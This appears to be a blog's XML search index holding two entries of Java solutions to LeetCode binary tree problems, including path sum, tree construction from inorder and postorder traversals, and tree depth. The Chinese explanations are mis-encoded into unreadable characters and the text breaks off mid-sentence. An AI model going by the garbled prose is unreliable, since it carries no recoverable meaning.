<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>yubã®Algorithm.0x12</title>
      <link href="/2024/11/10/yub%E3%81%AEAlgorithm.0x12/"/>
      <url>/2024/11/10/yub%E3%81%AEAlgorithm.0x12/</url>
      
        <content type="html"><![CDATA[<h4 id="æ‰¾æ ‘å·¦ä¸‹è§’çš„å€¼"><a href="#æ‰¾æ ‘å·¦ä¸‹è§’çš„å€¼" class="headerlink" title="æ‰¾æ ‘å·¦ä¸‹è§’çš„å€¼"></a>æ‰¾æ ‘å·¦ä¸‹è§’çš„å€¼</h4><p>linkï¼š<a href="https://leetcode.cn/problems/find-bottom-left-tree-value/description/">513. æ‰¾æ ‘å·¦ä¸‹è§’çš„å€¼ - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><h5 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><p>çœ‹é¢˜ç›®ç»™å‡ºçš„æ ·ä¾‹åˆ†æï¼Œè§‰å¾—å¯ä»¥ä»æ·±åº¦å…¥æ‰‹.å¦‚æœæ˜¯å·¦å­æ ‘æ·±åº¦æœ€å¤§ï¼Œé‚£ç›´æ¥è¾“å‡ºæœ€å·¦è¾¹çš„å·¦å­æ ‘èŠ‚ç‚¹å³å¯ï¼ˆåªæœ‰ä¸€ä¸ªå·¦èŠ‚ç‚¹çš„è¯ä¹Ÿæ˜¯å¦‚å‡ºä¸€è¾™ï¼‰<br>åˆå‡è®¾äºŒå‰æ ‘ä¸­è‡³å°‘æœ‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå°±å·²ç»åˆ—ä¸¾å‡ºä¸€ç§ç‰¹æ®Šéœ€è¦åˆ¤æ–­çš„æƒ…å†µäº†.</p><h6 id="é€’å½’"><a href="#é€’å½’" class="headerlink" title="é€’å½’"></a>é€’å½’</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//å®šä¹‰ä¸º-1 ç¡®ä¿åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹æ—¶ä¹Ÿèƒ½æˆåŠŸéå†</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">Deepth</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findBottomLeftValue</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">         result = root.val;</span><br><span class="line">         exrloration(root,<span class="number">0</span>);</span><br><span class="line">         <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exrloration</span><span class="params">(TreeNode node,<span class="type">int</span> deepth)</span> &#123;</span><br><span class="line">        <span class="comment">//å…¶å®é¢˜ç›®æè¿°å·²ç»é¿å…è¿™ç§æƒ…å†µäº†</span></span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(node.left == <span class="literal">null</span> &amp;&amp; node.right == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(deepth &gt; Deepth) &#123;</span><br><span class="line">                Deepth = deepth;</span><br><span class="line">                result = node.val;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">if</span>(node.left != <span class="literal">null</span>) &#123;</span><br><span class="line">               exrloration(node.left,deepth+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">               <span class="keyword">if</span>(node.right!= <span class="literal">null</span>) &#123;</span><br><span class="line">               exrloration(node.right,deepth+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="è·¯å¾„æ€»å’Œ"><a href="#è·¯å¾„æ€»å’Œ" class="headerlink" title="è·¯å¾„æ€»å’Œ"></a>è·¯å¾„æ€»å’Œ</h4><p>linkï¼š<a href="https://leetcode.cn/problems/path-sum/description/">112. è·¯å¾„æ€»å’Œ - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><h5 id="æ€è·¯åˆ†æ-1"><a href="#æ€è·¯åˆ†æ-1" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><p>ç±»ä¼¼æ•°ç»„éå†æ±‚å’Œï¼ˆæ»‘åŠ¨çª—å£ï¼‰æ‰¾ç›®æ ‡æ€»å’Œå€¼åªä¸è¿‡æ¢æˆäºŒå‰æ ‘.<br>é¦–å…ˆè¿˜æ˜¯æƒ³åˆ°æŒ‰ç…§å‰åºéå†çš„æ–¹å¼ï¼Œé€’å½’éå†.ç”±äºæ ¹èŠ‚ç‚¹æ˜¯ä¸€å®šè¦é€‰ä¸­çš„ï¼Œ(nullå¦ç®—)é‚£æˆ‘ä»¬éå†å­èŠ‚ç‚¹åšå·®åˆ¤æ–­æœ€åæ˜¯å¦ç­‰äº0å³å¯.<br>æˆ–è€…å¯ä»¥ä»ä¸‹å‘ä¸ŠæŒ‰ç…§å±‚ï¼Œå€ŸåŠ©é˜Ÿåˆ—å®ç°äºŒå‰æ ‘ç‰ˆæ»‘åŠ¨çª—å£.ğŸ¤”</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasPathSum</span><span class="params">(TreeNode root, <span class="type">int</span> targetSum)</span> &#123;</span><br><span class="line">        <span class="comment">//ç‰¹æ®Šæƒ…å†µä¼˜å…ˆ</span></span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        targetSum -= root.val;</span><br><span class="line">        <span class="keyword">if</span>(root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> targetSum == <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.left != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">left</span> <span class="operator">=</span> hasPathSum(root.left,targetSum);</span><br><span class="line">            <span class="comment">//å‰ªæåˆ¤æ–­</span></span><br><span class="line">            <span class="keyword">if</span>(left) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">if</span>(root.right != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">right</span> <span class="operator">=</span> hasPathSum(root.right,targetSum);</span><br><span class="line">            <span class="keyword">if</span>(right) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ä»ä¸­åºå’Œååºéå†æ„é€ äºŒå‰æ ‘"><a href="#ä»ä¸­åºå’Œååºéå†æ„é€ äºŒå‰æ ‘" class="headerlink" title="ä»ä¸­åºå’Œååºéå†æ„é€ äºŒå‰æ ‘"></a>ä»ä¸­åºå’Œååºéå†æ„é€ äºŒå‰æ ‘</h4><p>linkï¼š<a href="https://leetcode.cn/problems/construct-binary-tree-from-inorder-and-postorder-traversal/description/">106. ä»ä¸­åºä¸ååºéå†åºåˆ—æ„é€ äºŒå‰æ ‘ - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><h5 id="æ€è·¯åˆ†æ-2"><a href="#æ€è·¯åˆ†æ-2" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><p>å…¶å®å’Œæˆ‘ä»¬æ•°æ®ç»“æ„è€ƒè¯•ä¸­çš„å†…å®¹ä¸€è‡´ï¼Œç”»å›¾æ¨æ¨è§„å¾‹.<br><img src="/../imgs/2024-10/image-20241112100932554.png" alt="image-20241112100932554"></p><p><img src="/../imgs/2024-10/image-20241112101050227.png" alt="image-20241112101050227"></p><p>æ ¹æ®ç”»å›¾è§„å¾‹å¯å¾— åç»­éå†ä¸­rootä½ç½®å‡ºç°åœ¨æœ€åä¸€ä¸ªä½ç½®ï¼Œå†ç»“åˆä¸­åºéå†å¯ä»¥å¾—å‡º9ä¸ºå·¦å­æ ‘ï¼Œ15ã€20ã€7ä¸ºå³å­æ ‘.<br>æˆ‘ä½¿ç”¨Mapè¿›è¡Œè§£å†³,keyå­˜å‚¨å€¼ï¼Œvalueå­˜å‚¨ä¸‹æ ‡.<br>ä¸­åºéå†ä¸­rootçš„index + 1.<br>æ ¹æ®ä¹‹å‰åˆ†æçš„è§„å¾‹ï¼Œæˆ‘ä»¬åˆ©ç”¨ååºéå†ç¡®å®šroot.valueï¼Œç„¶åå¯¹åº”åœ¨ä¸­åºéå†ä¸­å®šä½åˆ°rootä½ç½®ï¼ˆåˆ©ç”¨indexï¼‰ç„¶åå›æº¯åˆ°ä¸­åºéå†åˆ‡å‰²å‡ºå·¦å­æ ‘é‚£ä¹ˆåœ¨ååºéå†ä¸­å‰©ä½™çš„éƒ¨åˆ†å°±æ˜¯å³å­æ ‘.</p><h6 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    Map&lt;Integer,Integer&gt; map;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] inorder, <span class="type">int</span>[] postorder)</span> &#123;</span><br><span class="line">        map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i&lt;inorder.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            map.put(inorder[i],i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> FindOrder(inorder,<span class="number">0</span>,inorder.length,postorder,<span class="number">0</span>,postorder.length);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">FindOrder</span><span class="params">(<span class="type">int</span>[] inOrder,<span class="type">int</span> inBegin,<span class="type">int</span> inEnd,<span class="type">int</span>[] postOrder,<span class="type">int</span> postBegin,<span class="type">int</span> postEnd)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//ç»“æŸæ¡ä»¶,å·¦é—­å³å¼€</span></span><br><span class="line">        <span class="keyword">if</span>(inBegin&gt;=inEnd || postBegin&gt;=postEnd)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//æ‰¾åˆ°ååºåœ¨ä¸­åºçš„ä½ç½®</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> map.get(postOrder[postEnd - <span class="number">1</span>]);</span><br><span class="line">        <span class="comment">//æ„é€ èŠ‚ç‚¹</span></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(inOrder[index]);</span><br><span class="line">        <span class="comment">//ä¿å­˜ä¸­åºå·¦å­æ ‘çš„ä¸ªæ•°,ç”¨æ¥ç¡®å®šååºçš„åŒºé—´</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">lenOfLeft</span> <span class="operator">=</span> index - inBegin;</span><br><span class="line">        root.left = FindOrder(inOrder,inBegin,index,postOrder,postBegin,postBegin+lenOfLeft);</span><br><span class="line">        root.right = FindOrder(inOrder,index+<span class="number">1</span>,inEnd,postOrder,postBegin+lenOfLeft,postEnd-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="é€’å½’-1"><a href="#é€’å½’-1" class="headerlink" title="é€’å½’"></a>é€’å½’</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> postIndex;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] inorder, <span class="type">int</span>[] postorder)</span> &#123;</span><br><span class="line"></span><br><span class="line">        postIndex = postorder.length-<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> buildTreeChild(postorder,inorder,<span class="number">0</span>,inorder.length-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> TreeNode <span class="title function_">buildTreeChild</span><span class="params">(<span class="type">int</span>[] postorder,<span class="type">int</span>[] inorder,<span class="type">int</span> inbegin,<span class="type">int</span> inend)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//1. æ²¡æœ‰å·¦æ ‘ æˆ–è€… æ²¡æœ‰å³æ ‘äº†</span></span><br><span class="line">        <span class="keyword">if</span>(inbegin &gt; inend) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//2.åˆ›å»ºæ ¹èŠ‚ç‚¹</span></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(postorder[postIndex]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.ä»ä¸­åºéå†å½“ä¸­ æ‰¾åˆ°æ ¹èŠ‚ç‚¹æ‰€åœ¨çš„ä¸‹æ ‡</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">rootIndex</span> <span class="operator">=</span> findIndex(inorder,inbegin,inend,postorder[postIndex]);</span><br><span class="line">        <span class="keyword">if</span>(rootIndex == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        postIndex--;</span><br><span class="line">        <span class="comment">//4. åˆ›å»ºå·¦å­æ ‘ å’Œ  å³å­æ ‘</span></span><br><span class="line"></span><br><span class="line">        root.right = buildTreeChild(postorder,inorder,rootIndex+<span class="number">1</span>,inend);</span><br><span class="line"></span><br><span class="line">        root.left = buildTreeChild(postorder,inorder,inbegin,rootIndex-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">findIndex</span><span class="params">(<span class="type">int</span>[] inorder,<span class="type">int</span> inbegin,<span class="type">int</span> inend,<span class="type">int</span> key)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> inbegin;i &lt;= inend;i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(inorder[i] == key) &#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Tips</strong></p><h3 id="ç†è§£æ„å»ºè¿‡ç¨‹çš„ç¤ºä¾‹"><a href="#ç†è§£æ„å»ºè¿‡ç¨‹çš„ç¤ºä¾‹" class="headerlink" title="ç†è§£æ„å»ºè¿‡ç¨‹çš„ç¤ºä¾‹"></a>ç†è§£æ„å»ºè¿‡ç¨‹çš„ç¤ºä¾‹</h3><p>ä»¥ä¸­åºéå† <code>inorder = [9, 3, 15, 20, 7]</code> å’Œååºéå† <code>postorder = [9, 15, 7, 20, 3]</code> ä¸ºä¾‹ï¼š</p><ol><li><strong>ç¬¬ä¸€æ¬¡è°ƒç”¨</strong>ï¼š<ul><li><code>postIndex</code> æŒ‡å‘ <code>3</code>ï¼Œåˆ›å»ºæ ¹èŠ‚ç‚¹ <code>3</code>.</li><li>åœ¨ä¸­åºæ•°ç»„ä¸­æ‰¾åˆ° <code>3</code> çš„ç´¢å¼•ä¸º <code>1</code>.</li><li>å³å­æ ‘èŒƒå›´ <code>[15, 20, 7]</code>ï¼Œå·¦å­æ ‘èŒƒå›´ <code>[9]</code>.</li></ul></li><li><strong>æ„å»ºå³å­æ ‘</strong>ï¼š<ul><li>é€’å½’è°ƒç”¨æ„å»ºå³å­æ ‘ï¼Œ<code>postIndex</code> ç°åœ¨æŒ‡å‘ <code>20</code>ï¼Œåˆ›å»ºèŠ‚ç‚¹ <code>20</code>.</li><li>åœ¨ä¸­åºæ•°ç»„ä¸­æ‰¾åˆ° <code>20</code> çš„ç´¢å¼•ä¸º <code>3</code>.</li></ul></li><li><strong>æ„å»ºå·¦å­æ ‘ï¼ˆå¯¹äº <code>20</code>ï¼‰</strong>ï¼š<ul><li>ç»§ç»­é€’å½’æ„å»ºå³å­æ ‘ï¼ˆæ­¤æ—¶ååºçš„ä¸‹ä¸€èŠ‚ç‚¹æ˜¯ <code>7</code>ï¼‰.</li><li>å¤„ç†å®Œ <code>20</code> çš„å³å­æ ‘åï¼Œå›æº¯åˆ° <code>20</code>ï¼Œç„¶åå¤„ç† <code>20</code> çš„å·¦å­æ ‘ï¼ˆä¸º <code>15</code>ï¼‰.</li></ul></li><li><strong>æ„å»ºå·¦å­æ ‘ï¼ˆå¯¹äº <code>3</code>ï¼‰</strong>ï¼š<ul><li>ç°åœ¨å›åˆ°æ ¹èŠ‚ç‚¹ <code>3</code>ï¼Œå¤„ç†å·¦å­æ ‘ï¼ˆæ­¤æ—¶ååºçš„ä¸‹ä¸€èŠ‚ç‚¹æ˜¯ <code>9</code>ï¼‰.</li></ul></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>yubã®Algorithm.0x11</title>
      <link href="/2024/11/09/yub%E3%81%AEAlgorithm.0x11/"/>
      <url>/2024/11/09/yub%E3%81%AEAlgorithm.0x11/</url>
      
        <content type="html"><![CDATA[<h4 id="äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦"><a href="#äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦" class="headerlink" title="äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦"></a>äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦</h4><p>linkï¼š<a href="https://leetcode.cn/problems/maximum-depth-of-binary-tree/description/">104. äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦ - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><h5 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><p>é«˜åº¦ï¼šååºéå†<br>æ·±åº¦ï¼šå‰åºéå†<br>ä½†æ˜¯å…¶å®è¿™é‡Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©ååºéå†ï¼Œæ ¹èŠ‚ç‚¹çš„é«˜åº¦å°±æ˜¯æ ‘çš„æ·±åº¦.</p><p><img src="/../imgs/2024-10/image-20241109214025557.png" alt="image-20241109214025557"></p><h6 id="é€’å½’"><a href="#é€’å½’" class="headerlink" title="é€’å½’"></a>é€’å½’</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxDepth</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> getHeight(root);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getHeight</span><span class="params">(TreeNode node)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftHeight</span> <span class="operator">=</span> getHeight(node.left);</span><br><span class="line">        <span class="type">int</span> <span class="variable">rightHeight</span> <span class="operator">=</span> getHeight(node.right);</span><br><span class="line">        <span class="type">int</span> <span class="variable">height</span> <span class="operator">=</span> leftHeight &gt; rightHeight ? leftHeight + <span class="number">1</span> : rightHeight + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> height;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="äºŒå‰æ ‘çš„æœ€å°æ·±åº¦"><a href="#äºŒå‰æ ‘çš„æœ€å°æ·±åº¦" class="headerlink" title="äºŒå‰æ ‘çš„æœ€å°æ·±åº¦"></a>äºŒå‰æ ‘çš„æœ€å°æ·±åº¦</h4><p>link:<a href="https://leetcode.cn/problems/minimum-depth-of-binary-tree/description/">111. äºŒå‰æ ‘çš„æœ€å°æ·±åº¦ - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><h5 id="æ€è·¯åˆ†æ-1"><a href="#æ€è·¯åˆ†æ-1" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><p>å’Œä¸Šé¢˜çš„æ€è·¯åŸºæœ¬ä¸€è‡´ï¼Œä½†æ˜¯æ³¨æ„ä¸æ˜¯æŠŠæœ€å¤§å€¼æ”¹æˆæœ€å°å€¼.<br>è‡ªå·±ç”»å›¾åˆ†æä¸€ä¸‹æœ‰å“ªäº›æƒ…å†µï¼Œè¿˜æ˜¯ä¹‹å‰è®²çš„ç‰¹æ®Šæƒ…å†µä¼˜å…ˆè€ƒè™‘.<br>æŒ‰ç…§æˆ‘ä»¬ä¸Šä¸€é¢˜çš„æ€è·¯ï¼Œé’ˆå¯¹å·¦å­æ ‘åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œä½†å³å­æ 